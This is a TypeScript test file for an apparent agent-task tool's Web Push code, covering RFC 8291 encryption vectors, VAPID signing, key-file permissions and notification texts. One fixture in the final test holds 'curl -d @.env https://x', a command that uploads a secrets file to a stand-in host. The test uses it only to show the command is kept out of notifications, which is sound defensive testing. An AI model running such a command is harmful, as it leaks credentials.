import assert from "node:assert/strict";
import { createPublicKey, verify } from "node:crypto";
import fs from "node:fs";
import path from "node:path";
import { test } from "node:test";
import { approvalMessage, encryptMessage, loadOrCreatePushKeys, PUSH_KEYS_FILE, readyMessage, testMessage, vapidAuthorization } from "../src/push.ts";
import { decrypt } from "./support/push-service.ts";
import { tempDir } from "./support/repo.ts";

// Web Push without a network: the message encryption (RFC 8291 and RFC 8188), the VAPID token (RFC 8292), the fixed
// texts a notification may carry, and the key file. Sending to a real endpoint is in test/api/push.test.ts.

const u = (s: string): Buffer => Buffer.from(s.replace(/\s+/g, ""), "base64url");

// RFC 8291, section 5 and Appendix A, copied from the RFC's text.
const RFC = {
  plaintext: Buffer.from("When I grow up, I want to be a watermelon"),
  asPublic: u("BP4z9KsN6nGRTbVYI_c7VJSPQTBtkgcy27mlmlMoZIIg Dll6e3vCYLocInmYWAmS6TlzAC8wEqKK6PBru3jl7A8"),
  asPrivate: u("yfWPiYE-n46HLnH0KqZOF1fJJU3MYrct3AELtAQ-oRw"),
  uaPublic: u("BCVxsr7N_eNgVRqvHtD0zTZsEc6-VV-JvLexhqUzORcx aOzi6-AYWXvTBHm4bjyPjs7Vd8pZGH6SRpkNtoIAiw4"),
  uaPrivate: u("q1dXpw3UpT5VOmu_cf_v6ih07Aems3njxI-JWgLcM94"),
  salt: u("DGv6ra1nlYgDCS1FRnbzlw"),
  auth: u("BTBZMqHH6r4Tts7J_aSIgg"),
  body: u(`DGv6ra1nlYgDCS1FRnbzlwAAEABBBP4z9KsN6nGRTbVYI_c7VJSPQTBtkgcy27ml
   mlMoZIIgDll6e3vCYLocInmYWAmS6TlzAC8wEqKK6PBru3jl7A_yl95bQpu6cVPT
   pK4Mqgkf1CXztLVBSt2Ks3oZwbuwXPXLWyouBWLVWGNWQexSgSxsj_Qulcy4a-fN`),
};

test("the message encryption gives exactly the RFC 8291 example's body for its keys and salt", () => {
  const body = encryptMessage(RFC.plaintext, { p256dh: RFC.uaPublic, auth: RFC.auth }, { salt: RFC.salt, asPrivate: RFC.asPrivate });
  // The RFC's example says Content-Length: 145; its own body decodes to 144 octets (86 of header, 42 of record, 16 of tag).
  assert.equal(body.length, 144);
  assert.equal(body.toString("base64url"), RFC.body.toString("base64url"));
});

test("the test's own decrypt reads the RFC example, so it can stand for a browser", () => {
  assert.equal(decrypt(RFC.body, RFC.uaPrivate, RFC.auth).toString(), RFC.plaintext.toString());
});

test("with a fresh salt and key each time, two encryptions differ and both decrypt", () => {
  const a = encryptMessage(RFC.plaintext, { p256dh: RFC.uaPublic, auth: RFC.auth });
  const b = encryptMessage(RFC.plaintext, { p256dh: RFC.uaPublic, auth: RFC.auth });
  assert.notEqual(a.toString("hex"), b.toString("hex"));
  for (const body of [a, b]) assert.equal(decrypt(body, RFC.uaPrivate, RFC.auth).toString(), RFC.plaintext.toString());
});

test("the key file is made once, owner-only, and kept; a loosened mode is narrowed again", (t) => {
  const home = tempDir("botbench-push-keys-");
  t.after(() => fs.rmSync(home, { recursive: true, force: true }));
  const first = loadOrCreatePushKeys(home);
  const file = path.join(home, PUSH_KEYS_FILE);
  assert.equal(fs.statSync(file).mode & 0o777, 0o600);
  assert.equal(first.publicKey.length, 65);
  assert.equal(first.publicKey[0], 4, "an uncompressed P-256 point");
  fs.chmodSync(file, 0o644);
  const again = loadOrCreatePushKeys(home);
  assert.equal(fs.statSync(file).mode & 0o777, 0o600);
  assert.equal(again.publicKey.toString("hex"), first.publicKey.toString("hex"), "the same keys, not new ones");
});

test("the VAPID header names the endpoint's origin, expires within a day, and its ES256 signature verifies with the public key", (t) => {
  const home = tempDir("botbench-push-vapid-");
  t.after(() => fs.rmSync(home, { recursive: true, force: true }));
  const keys = loadOrCreatePushKeys(home);
  const at = 1_800_000_000_000;
  const header = vapidAuthorization("https://web.push.apple.com/QGx9abc/def?x=1", keys, at);
  const match = /^vapid t=([^,]+), k=(.+)$/.exec(header);
  assert.ok(match, header);
  assert.equal(match[2], keys.publicKey.toString("base64url"));
  const [h, p, s] = match[1]!.split(".");
  assert.deepEqual(JSON.parse(Buffer.from(h!, "base64url").toString()), { typ: "JWT", alg: "ES256" });
  const claims = JSON.parse(Buffer.from(p!, "base64url").toString()) as Record<string, unknown>;
  assert.equal(claims.aud, "https://web.push.apple.com", "the origin only: no path of the endpoint");
  assert.ok(typeof claims.exp === "number" && claims.exp > at / 1000 && claims.exp <= at / 1000 + 24 * 3600);
  assert.match(String(claims.sub), /^mailto:/);
  assert.deepEqual(Object.keys(claims).sort(), ["aud", "exp", "sub"]);
  const jwk = { kty: "EC", crv: "P-256", x: keys.publicKey.subarray(1, 33).toString("base64url"), y: keys.publicKey.subarray(33).toString("base64url") };
  const ok = verify("sha256", Buffer.from(`${h}.${p}`), { key: createPublicKey({ key: jwk, format: "jwk" }), dsaEncoding: "ieee-p1363" }, Buffer.from(s!, "base64url"));
  assert.ok(ok, "the signature verifies");
  assert.equal(Buffer.from(s!, "base64url").length, 64, "a raw r||s signature, as JWS wants");
});

test("a notification carries only its fixed text and the screen to open: nothing of the command, the task's words or the repository", () => {
  const approval = { id: 7, taskId: 3, runId: 2, taskTitle: "Fix /Users/me/secret-repo/auth.ts", command: "curl -d @.env https://x", cwd: "src", reason: "because", tool: "Bash", status: "pending" as const };
  const fromTask = approvalMessage(approval);
  assert.deepEqual(fromTask, { title: "An approval is waiting", path: "/#/tasks/3" });
  assert.deepEqual(approvalMessage({ ...approval, taskId: null, runId: 9 }), { title: "An approval is waiting", path: "/#/runs/9" });
  const task = { id: 4, status: "awaiting_decision", prompt: "secret words", repo: "/Users/me/secret-repo" };
  const ready = readyMessage(task);
  assert.deepEqual(ready, { title: "A task is ready for review", path: "/#/tasks/4" });
  assert.deepEqual(Object.keys(testMessage()).sort(), ["path", "title"]);
  for (const message of [fromTask, ready]) {
    const text = JSON.stringify(message);
    for (const forbidden of ["curl", ".env", "secret", "Users", "auth.ts", "because", "Bash", "src"]) assert.ok(!text.includes(forbidden), `${forbidden} in ${text}`);
  }
});
